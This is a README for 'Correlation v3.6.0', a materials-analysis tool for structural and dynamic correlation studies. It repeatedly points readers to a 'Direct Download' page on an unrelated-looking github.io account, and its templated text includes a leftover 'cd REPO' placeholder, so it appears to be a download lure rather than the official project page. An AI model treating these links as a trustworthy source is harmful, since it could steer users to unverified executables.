# Correlation v3.6.0 - materials analysis software 2026

> **Correlation is a desktop, CLI, and Python materials analysis tool for structural and dynamic correlation studies, delivering version 3.6.0 with GUI and headless workflows for simulation data.**

[![Platform](https://img.shields.io/badge/Platform-desktop%2C%20CLI%2C%20Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3.6.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/emiladams1982/correlation-win-61128?style=flat-square)](https://github.com/emiladams1982/correlation-win-61128)

---

<p align="center">
  <a href="https://emiladams1982.github.io/correlation-win-61128/">
    <img src="https://img.shields.io/badge/Download-Correlation%20Latest-brightgreen?style=for-the-badge" alt="Download Correlation">
  </a>
</p>

> **[Direct Download - Correlation v3.6.0](https://emiladams1982.github.io/correlation-win-61128/)**

---

[Download Latest Build](https://emiladams1982.github.io/correlation-win-61128/)

---

## About Correlation

Correlation is built for researchers and developers working with materials science data, especially in molecular simulation and post-processing workflows. It helps analyze liquids, amorphous solids, and crystalline materials by turning raw simulation output into correlation metrics that are easier to compare, interpret, and export.

The project combines a graphical interface with command-line and Python access, so it can fit both interactive exploration and scripted pipelines. It is especially useful when you need repeatable analysis across different file formats, large datasets, or multiple correlation functions in one workflow.

---

## Features

- GUI and headless CLI modes for flexible analysis workflows
- Structural and dynamic correlation calculations in one tool
- Supports RDF, PAD, DAD, CNA, MSD, VACF, VDOS, S(Q), and XRD
- Parallelized processing using SIMD and TBB
- Optional CUDA acceleration for supported setups
- Imports major simulation file formats, including CAR, CELL, and ARC
- Exports results to CSV, Parquet, and HDF5
- Python bindings for scripting and integration

---

## Installation

Clone the repository or download the latest build, then run the application in the mode that matches your workflow.

    git clone https://github.com/emiladams1982/correlation-win-61128.git
    cd REPO

For a GUI session, launch the desktop application from the packaged build or your local environment. For scripted analysis, use the CLI entry point or import the Python bindings into your own code.

---

## Usage

Typical usage follows a simple pattern: load simulation data, choose the analysis type, run the computation, and export the result.

Example workflow:

    correlation --input sample.arc --analysis rdf --output results.csv

You can also combine analyses for broader post-processing tasks, such as checking structure factor trends, inspecting motion through VACF and MSD, or comparing crystalline and amorphous datasets in the same project.

---

## Configuration

Settings are typically managed through the application interface, command-line flags, or your Python workflow depending on how you run Correlation.

If you maintain reusable defaults, keep them in a local config file or in the script that launches your analysis job:

    {
      "input_format": "ARC",
      "analyses": ["rdf", "vacf", "vdos"],
      "export_format": "parquet",
      "use_cuda": false
    }

---

## Requirements

- Desktop, CLI, or Python-capable environment
- Supported simulation input files such as CAR, CELL, or ARC
- Sufficient memory and storage for the datasets you process
- Optional CUDA-compatible hardware for acceleration
- TBB and SIMD-capable runtime support for parallelized execution when available

---

## FAQ

**How do I get updates?**  
Use the latest release or download page linked above for the current build.

**Can I use Correlation without the GUI?**  
Yes. The project includes headless CLI usage as well as Python bindings for scripted analysis.

**Where do I change settings?**  
Use the GUI options, CLI parameters, or your own Python code depending on your workflow.

**What if my data is in a different format?**  
Correlation supports major simulation file formats, and the exact import behavior depends on the file type you provide.

**What should I do if analysis is slow?**  
Try parallelized execution, and enable CUDA if your system and build support it.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
